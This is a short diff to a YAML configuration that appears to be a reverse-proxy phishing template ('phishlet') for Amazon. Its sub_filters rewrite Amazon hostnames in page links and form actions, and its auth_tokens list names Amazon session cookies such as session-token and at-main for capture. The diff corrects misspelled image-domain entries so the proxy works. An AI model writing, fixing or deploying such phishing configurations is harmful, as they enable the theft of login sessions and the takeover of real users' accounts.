@@ -9,8 +9,8 @@ sub_filters:
   - {triggers_on: 'www.amazon.com', orig_sub: 'www', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
   - {triggers_on: 'fls-na.amazon.com', orig_sub: 'fls-na', domain: 'amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-iges-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
-  - {triggers_on: 'images-na.ssl-iamges-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-images-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'action="https://{hostname}', replace: 'action="https://{hostname}', mimes: ['text/html', 'application/json']}
+  - {triggers_on: 'images-na.ssl-images-amazon.com', orig_sub: 'images-na', domain: 'ssl-images-amazon.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json']}
 auth_tokens:
   - domain: '.amazon.com'
     keys: ['at-main','lc-main','sess-at-main','session-id','session-id-time','session-token','sst-main','ubid-main','x-main','skin','a-ogbcbff']
